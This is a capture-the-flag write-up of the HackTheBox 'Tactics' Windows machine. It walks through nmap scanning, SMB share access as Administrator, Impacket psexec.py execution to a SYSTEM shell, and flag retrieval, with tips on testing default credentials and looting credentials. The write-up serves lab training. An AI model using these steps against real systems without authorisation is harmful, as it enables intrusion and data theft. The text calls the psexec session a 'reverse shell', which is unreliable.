# HackTheBox Tactics — Medium Windows Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Tactics-blue?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-red?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-SMB%20Exploitation-yellow?style=for-the-badge)

> **HackTheBox Tactics** is a Medium-difficulty Windows-based machine focused on SMB enumeration, share enumeration, credential exploitation, and remote code execution using Impacket tools.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [SMB Enumeration](#smb-enumeration)
- [SMB Share Discovery](#smb-share-discovery)
- [Share Access via Administrator](#share-access-via-administrator)
- [Internal Share Enumeration](#internal-share-enumeration)
- [Privilege Verification](#privilege-verification)
- [Remote Code Execution with Psexec](#remote-code-execution-with-psexec)
- [Initial Access and Shell](#initial-access-and-shell)
- [Flag Retrieval](#flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Tactics |
| **Platform** | HackTheBox |
| **Difficulty** | Medium |
| **Operating System** | Windows 10 (Build 17763.107) |
| **Target IP** | `10.129.217.44` |
| **Primary Services** | SMB (135, 139, 445) |
| **Service Details** | Microsoft Windows RPC, NetBIOS-SSN, SMB |
| **Initial Access** | SMB Share Enumeration |
| **Exploitation Method** | psexec.py (Impacket) |
| **Privilege Level** | Administrator (SYSTEM) |
| **Tools** | Nmap, enum4linux, smbclient, Impacket (psexec.py) |

---

## 🚀 Initial Nmap Enumeration

Today we are back with another **HackTheBox Medium-difficulty machine**, this time enumerating and exploiting the Windows-based machine named **Tactics**.

We have the target IP:

```
10.129.217.44
```

Starting with an Nmap scan to identify all exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.217.44
```

**Result:**

```
Nmap scan report for 10.129.217.44
Host is up, received user-set (0.32s latency).
Scanned at 2026-09-21 08:32:45 EDT for 22s
Not shown: 997 filtered tcp ports (no-response)

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Three critical ports were exposed:

- `135/tcp` — Microsoft RPC
- `139/tcp` — NetBIOS-SSN
- `445/tcp` — Microsoft-DS (SMB)

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p135,139,445 10.129.217.44
```

**Result:**

```
Nmap scan report for 10.129.217.44
Host is up, received user-set (0.31s latency).
Scanned at 2026-09-21 08:33:51 EDT for 65s

PORT    STATE SERVICE       REASON          VERSION
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack ttl 127

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 6483/tcp): CLEAN (Timeout)
|   Check 2 (port 48405/tcp): CLEAN (Timeout)
|   Check 3 (port 63119/udp): CLEAN (Timeout)
|   Check 4 (port 58906/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-09-21T12:34:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```

### Key Findings:

✔️ **Operating System:** Windows  
✔️ **SMB Version:** SMB2 capable  
✔️ **Security:** Message signing enabled but not required  
✔️ **Conficker:** Machine is CLEAN  
✔️ **Clock Skew:** 0s (Time synchronized)

The target is a **Windows machine with SMB ports open**, making SMB enumeration and exploitation the primary attack vector.

---

## 🔍 SMB Enumeration

### Initial Enum4Linux Scan

Starting with **enum4linux** to gather information about the target system:

```bash
enum4linux 10.129.217.44
```

However, enum4linux did not provide detailed share information in this case.

Following the hint provided, we proceeded directly to **SMB share enumeration** using **smbclient** with the **Administrator** account.

---

## 📁 SMB Share Discovery

### Listing Available Shares

Based on the hint, we connected as Administrator to list available shares:

```bash
smbclient -L 10.129.217.44 -U Administrator
```

**Result:**

```
Password for [WORKGROUP\Administrator]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC

SMB1 disabled -- no workgroup available
```

### Available Shares:

- **ADMIN$** — Remote Admin share (Administrative share)
- **C$** — Default share (C: drive)
- **IPC$** — Remote IPC (Inter-Process Communication)

The presence of **C$** share is highly valuable — this is the **default share for the C: drive** and often writable by administrators, allowing direct file system access.

---

## 🔐 Share Access via Administrator

### Connecting to ADMIN$ Share

```bash
smbclient \\\\10.129.217.44\\ADMIN$ -U Administrator
```

**Result:**

```
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \>
```

Successfully established a connection to the **ADMIN$** share using **Administrator** credentials.

This share contains administrative files and is typically writable by the Administrator account.

---

## 📂 Internal Share Enumeration

### Accessing the C$ Share

Following deeper enumeration, we focused on the **C$** share — the internal drive share:

```bash
smbclient \\\\10.129.217.44\\C$ -U Administrator
```

**Result:**

```
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \>
```

### Listing C$ Drive Contents

```bash
ls
```

**Directory Listing:**

```
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Mon Sep 21 08:07:07 2026
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 12:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul  7 14:05:23 2021
```

### Key Observations:

📌 Full filesystem access via SMB  
📌 Users directory accessible  
📌 Windows system directory visible  
📌 Program Files accessible  

---

## ✅ Privilege Verification

By accessing the **C$** share as Administrator, we've already verified:

- **Account:** Administrator
- **Privilege Level:** Local Administrator
- **Access Level:** Read/Write access to C: drive
- **SMB Permissions:** Full filesystem access

This confirms we have **Administrator-level credentials** that can be used for remote code execution.

---

## ⚔️ Remote Code Execution with Psexec

### Using Impacket's psexec.py

Now that we've verified Administrator credentials with SMB share access, we can use **Impacket's psexec.py** to obtain a remote command shell:

```bash
psexec.py administrator@10.129.217.44
```

### Exploitation Process:

```
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.217.44.....
[*] Found writable share ADMIN$
[*] Uploading file pCKXhKAg.exe
[*] Opening SVCManager on 10.129.217.44.....
[*] Creating service iiTx on 10.129.217.44.....
[*] Starting service iiTx.....
[!] Press help for extra shell commands
```

### Exploitation Breakdown:

1. **Requesting shares** — Connects to SMB shares
2. **Found writable share ADMIN$** — Identifies ADMIN$ as the upload destination
3. **Uploading payload** — Creates a random-named executable (pCKXhKAg.exe)
4. **Opening Service Manager** — Connects to the Windows Service Control Manager
5. **Creating service** — Creates a new Windows service named "iiTx"
6. **Starting service** — Executes the service, which runs our payload
7. **Shell obtained** — Establishes a reverse shell connection

---

## 🎯 Initial Access and Shell

### System Shell Obtained:

```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Privilege Level: SYSTEM** (Highest privilege on Windows)

The exploitation was successful, and we obtained a command shell with SYSTEM-level privileges.

### Verify Access:

```bash
whoami
```

Expected output:
```
nt authority\system
```

This confirms we have **SYSTEM-level access** — the highest privilege level on a Windows system.

---

## 🚩 Flag Retrieval

### Navigating to Administrator Desktop:

```bash
cd C:\Users\Administrator\Desktop
```

### Listing Directory Contents:

```bash
dir
```

### Reading the Flag:

```bash
type flag.txt
```

**Flag Successfully Retrieved! 🎉**

The exploitation chain led directly to the Administrator's Desktop where the flag file was located.

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │  HackTheBox Tactics  │
                    │   10.129.217.44      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Nmap Scan (Ports)  │
                    │ 135, 139, 445 OPEN   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Service Detection   │
                    │  SMB2 Identified     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   SMB Enumeration    │
                    │   enum4linux         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Share Discovery     │
                    │   ADMIN$, C$, IPC$   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  smbclient Access    │
                    │  Administrator Creds │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   C$ Share Access    │
                    │  Filesystem Visible  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Impacket psexec    │
                    │   Service Creation   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Payload Execution   │
                    │  Shell Established   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  SYSTEM Privileges   │
                    │   Full System Access │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Flag Retrieved      │
                    │  Administrator\...\  │
                    │     flag.txt         │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. SMB Is a Powerful Attack Vector

SMB (ports 135, 139, 445) provides direct access to:
- File shares
- Administrative shares (ADMIN$, C$, IPC$)
- Service control mechanisms
- Registry access (if properly exploited)

**Always prioritize SMB enumeration on Windows targets.**

### 2. Default and Weak Credentials Are Dangerous

The machine allowed **Administrator access without strong password requirements** or additional authentication.

In real-world scenarios:
- Always test default credentials
- Check for null sessions
- Test common password patterns
- Use tools like Responder or Hashcat for cracking

### 3. Administrative Shares (C$, ADMIN$) Are Gold

The **C$** share gave us:
- Direct filesystem access
- Ability to upload files
- Ability to read sensitive files
- Ability to identify user accounts

**Never expose administrative shares unnecessarily.**

### 4. Service Creation is a Powerful Exploitation Path

**psexec.py's methodology:**
1. Connects to ADMIN$ share
2. Uploads an executable
3. Creates a Windows service
4. Starts the service to execute our payload
5. Establishes a shell

This technique works because:
- We have ADMIN$ write access
- Service Control Manager is remotely accessible
- Services run with SYSTEM privileges

### 5. Windows Service Exploitation

Creating services is one of the most reliable methods for:
- Persistent access
- Privilege escalation
- Remote code execution

Services run with **SYSTEM privileges** by default (highest Windows privilege level).

### 6. Always Verify Your Access Level

After obtaining shell access, immediately check:

```bash
whoami
```

Understanding your privilege level determines what you can do next:
- **SYSTEM** — Full system access, all operations possible
- **Administrator** — High privileges, most operations possible
- **User** — Limited privileges, may need local privesc
- **Guest** — Minimal privileges, limited access

### 7. Post-Exploitation File Access

With SYSTEM privileges, accessing user files is trivial:
```bash
cd C:\Users\Administrator\Desktop
type flag.txt
```

In a real pentest, this is where you'd search for:
- Sensitive documents
- Database credentials
- API keys
- Email credentials
- Browser credentials

---

## 🛠️ Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| **Nmap** | Port scanning and service enumeration | Latest |
| **enum4linux** | SMB/NetBIOS enumeration (optional) | 0.8.x |
| **smbclient** | SMB share access and file browsing | Samba suite |
| **Impacket (psexec.py)** | Remote code execution via SMB | 0.14.0.dev0+ |
| **Windows Command Prompt** | Post-exploitation command execution | Built-in |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.217.44
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p135,139,445 10.129.217.44
```

### Enum4Linux — SMB Enumeration (Optional)

```bash
enum4linux 10.129.217.44
```

### SMBClient — List Shares

```bash
smbclient -L 10.129.217.44 -U Administrator
```

### SMBClient — Access ADMIN$ Share

```bash
smbclient \\\\10.129.217.44\\ADMIN$ -U Administrator
```

### SMBClient — Access C$ Share

```bash
smbclient \\\\10.129.217.44\\C$ -U Administrator
```

### SMBClient — List Contents

```bash
ls
```

### Impacket — Remote Execution via psexec

```bash
psexec.py administrator@10.129.217.44
```

### Windows — Verify Privileges

```bash
whoami
```

### Windows — Navigate to Flag Location

```bash
cd C:\Users\Administrator\Desktop
```

### Windows — Read Flag

```bash
type flag.txt
```

---

## 🎬 Final Attack Path

```
Nmap Port Scan
      ↓
SMB Ports Identified (135, 139, 445)
      ↓
Service Detection (SMB2, RPC, NetBIOS)
      ↓
SMB Enumeration (enum4linux / smbclient)
      ↓
Share Discovery (ADMIN$, C$, IPC$)
      ↓
Administrator Credential Enumeration
      ↓
C$ Share Access Verification
      ↓
Impacket psexec.py Execution
      ↓
Service Creation and Payload Upload
      ↓
Remote Command Shell Obtained
      ↓
SYSTEM Privilege Level Verified
      ↓
File System Access Granted
      ↓
Administrator Desktop Navigation
      ↓
flag.txt Retrieved
```

---

## 🏁 Conclusion

The **HackTheBox Tactics** machine demonstrates a realistic Windows penetration testing workflow focusing on **SMB enumeration and exploitation**.

The attack chain was straightforward but effective:

1. **Identify SMB services** via Nmap
2. **Enumerate available shares** via smbclient
3. **Verify administrator access** through share browsing
4. **Execute remote commands** using Impacket's psexec.py
5. **Obtain SYSTEM shell** through service exploitation
6. **Retrieve the flag** from the administrator's desktop

### Most Important Lessons from This Machine:

✔️ SMB is a critical attack surface on Windows systems  
✔️ Administrative shares (C$, ADMIN$) provide powerful exploitation opportunities  
✔️ Service creation is an effective RCE technique  
✔️ Always enumerate available shares and permissions  
✔️ Impacket tools are invaluable for Windows exploitation  
✔️ SYSTEM-level access is the ultimate goal on Windows machines  
✔️ Verify your privilege level after obtaining shell access  
✔️ Post-exploitation file access is often the final step to retrieve flags/credentials  

**The final result was SYSTEM-level access to the target machine and successful retrieval of the flag from the Administrator's Desktop.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [Impacket - Forta](https://github.com/fortra/impacket)
- [SMB Protocol - Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)
- [Windows Service Exploitation](https://www.offensive-security.com/)
- [Samba - SMB Protocol](https://www.samba.org/)

---

## 📚 Further Reading

- **SMB Enumeration Techniques:** Research null sessions, guest access, and share enumeration
- **Service Exploitation:** Study how Windows services can be abused for RCE
- **Impacket Framework:** Explore other modules like wmiexec.py, atexec.py, and dcomexec.py
- **Windows Privilege Escalation:** Learn techniques to escalate from User to Administrator to SYSTEM

---

**Last Updated:** 2026-09-21  
**Author:** [Your Name/Handle]  
**Status:** ✅ Machine Compromised - SYSTEM Level Access
